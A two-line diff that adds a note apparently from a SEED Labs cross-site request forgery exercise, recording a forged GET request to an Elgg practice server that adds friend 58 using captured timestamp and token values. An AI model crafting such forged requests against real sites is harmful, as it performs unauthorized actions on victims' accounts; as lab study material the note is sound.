@@ -1,0 +1,2 @@
+# CSRF using GET request
+get request: http://www.seed-server.com/action/friends/add?friend=58&__elgg_ts=1648491568&__elgg_token=h7S7iJMEC-ZpTk_GBxHd9w&__elgg_ts=1648491563&__elgg_token=T3acTCNhdM7Y3u9QMCZ9yQ
